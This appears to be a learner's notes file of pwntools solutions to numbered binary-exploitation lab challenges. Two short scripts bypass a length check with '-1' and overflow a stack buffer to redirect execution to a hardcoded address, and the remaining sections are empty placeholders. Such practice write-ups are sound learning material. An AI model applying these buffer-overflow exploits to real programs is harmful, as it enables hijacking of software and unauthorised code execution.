## 4
### .0
```py
from pwn import *
context(os='linux',arch='amd64')
elfpath=os.path.join('/challenge',os.listdir('/challenge')[0])
io=process(elfpath)

io.sendline('-1')

pl=b'b'*120+p64(0x40229d)

io.send(pl)
print(io.recvall().decode())

```
### .1
```py

from pwn import *
context(os='linux',arch='amd64')
elfpath=os.path.join('/challenge',os.listdir('/challenge')[0])
# elfpath=os.path.join('/home/hacker/challenge',os.listdir('/challenge')[0])
io=process(elfpath)
io.sendline('-1')

pl=b'b'*(0x30+8)+p64(0x4020d3)

io.send(pl)
print(io.recvall().decode())

```
## 5
### .0
```py

```
### .1
```py

```
## 6
### .0
```py

```
### .1
```py

```
## 7
### .0
```py

```
### .1
```py

```
## 8
### .0
```py

```
### .1
```py

```
## 9
### .0
```py

```
### .1
```py

```
## 10
### .0
```py

```
### .1
```py

```
## 11
### .0
```py

```
### .1
```py

```
## 12
### .0
```py

```
### .1
```py

```
## 13
### .0
```py

```
### .1
```py

```
## 14
### .0
```py

```
### .1
```py

```
## 15
### .0
```py

```
### .1
```py

```
